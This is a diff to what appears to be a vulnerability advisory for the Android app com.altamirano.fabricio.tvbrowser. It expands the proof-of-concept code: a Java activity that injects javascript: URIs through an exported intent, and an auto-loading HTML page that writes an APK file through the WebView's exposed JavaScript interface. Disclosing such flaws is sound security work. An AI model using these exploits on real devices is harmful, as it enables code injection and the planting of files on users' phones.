@@ -15,10 +15,37 @@ An attacker can invoke the `MainActivity` of the `com.altamirano.fabricio.tvbrow
 
 **Proof of Concept (Code Injection):**
 ```java
-Intent intent = new Intent(Intent.ACTION_VIEW);
-intent.setComponent(new ComponentName("com.altamirano.fabricio.tvbrowser", "com.altamirano.fabricio.tvbrowser.MainActivity"));
-intent.setData(Uri.parse("maliciouswebsite.com"));
-startActivity(intent);
+package your.own.package;
+
+import android.content.ComponentName;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        // Launch the JavaScript code via intent
+        launchBrowser();
+    }
+
+    public void launchBrowser() {
+        // Constructing the JavaScript code to directly invoke the exposed JavaScript interface method.
+        String base64TestData = "VGhpcyBpcyBhIHRlc3QgZm9yIHRoZSB2dWxuZXJhYmlsaXR5IFBvQy4="; // Represents "This is a test for the vulnerability PoC."
+        String jsCode = String.format("javascript:if(window.Android && typeof window.Android.getBase64FromBlobData === 'function'){ window.Android.getBase64FromBlobData('data:text/plain;base64,%s', 'test.txt'); }", base64TestData);
+
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        intent.setComponent(new ComponentName("com.altamirano.fabricio.tvbrowser", "com.altamirano.fabricio.tvbrowser.MainActivity"));
+        intent.setData(Uri.parse(jsCode));
+        startActivity(intent);
+    }
+}
+
 ```
 
 ---
@@ -28,28 +55,45 @@ The `MainActivity`'s WebView exposes certain JavaScript interfaces to web conten
 
 **Proof of Concept (Arbitrary File Creation):**
 ```javascript
-document.getElementById("fetchAndDownloadAPKButton").addEventListener("click", function() {
-    fetchAndDownloadAPKData();
-});
 
-function fetchAndDownloadAPKData() {
-    fetch('/base64.txt')
-        .then(response => response.text())
-        .then(data => {
-            let base64data = "data:application/octet-stream;base64," + data.trim();
-            let filename = "fetched_file.apk"; 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerability Demo - test.html</title>
+</head>
+<body>
+    <h1>Vulnerability Test Page</h1>
+    <p>This page will automatically invoke the exposed JavaScript interface.</p>
 
-            if (window.Android && typeof window.Android.getBase64FromBlobData === "function") {
-                window.Android.getBase64FromBlobData(base64data, filename);
-            } else {
-                alert("Android interface not available for download");
-            }
-        })
-        .catch(error => {
-            console.error("There was an error fetching the data:", error);
-            alert("Error fetching base64 data.");
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            fetchAndDownloadAPKData();
         });
-}
+
+        function fetchAndDownloadAPKData() {
+            fetch('/base64.txt')
+                .then(response => response.text())
+                .then(data => {
+                    let base64data = "data:application/octet-stream;base64," + data.trim();
+                    let filename = "fetched_file.apk"; 
+
+                    if (window.Android && typeof window.Android.getBase64FromBlobData === "function") {
+                        window.Android.getBase64FromBlobData(base64data, filename);
+                    } else {
+                        alert("Android interface not available for download");
+                    }
+                })
+                .catch(error => {
+                    console.error("There was an error fetching the data:", error);
+                    alert("Error fetching base64 data.");
+                });
+        }
+    </script>
+</body>
+</html>
+
 ```
 
 ---
